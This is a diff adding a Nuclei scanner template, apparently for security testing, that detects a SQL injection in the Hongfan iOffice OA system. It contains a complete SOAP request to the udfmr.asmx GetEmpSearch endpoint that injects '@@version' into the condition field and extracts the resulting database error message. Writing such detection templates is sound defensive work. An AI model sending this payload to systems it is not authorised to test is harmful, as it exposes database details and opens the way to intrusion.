@@ -1,0 +1,42 @@
+id: hongfan-ioffice-sql-injection
+
+info:
+  name: Hongfan Ioffice System SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Hongfan ioffice is a widely used OA system. There is a SQL injection vulnerability in one of its API interfaces, which allows attackers to exploit database information or even achieve server system access.
+  tags: sql-injection
+
+variables:
+  sql_payload: "@@version"
+
+http:
+  - raw:
+      - |
+        POST /iOffice/prg/set/wss/udfmr.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/soap+xml; charset=utf-8
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope">
+          <soap12:Body>
+            <GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr">
+              <condition>1={{sql_payload}}</condition>
+            </GetEmpSearch>
+          </soap12:Body>
+        </soap12:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "System.Data.SqlClient.SqlException"
+        part: body
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "System\\.Data\\.SqlClient\\.SqlException: ([\\s\\S]+?)System\\.Data\\.SqlClient\\.SqlConnection\\.OnError"
+        group: 1
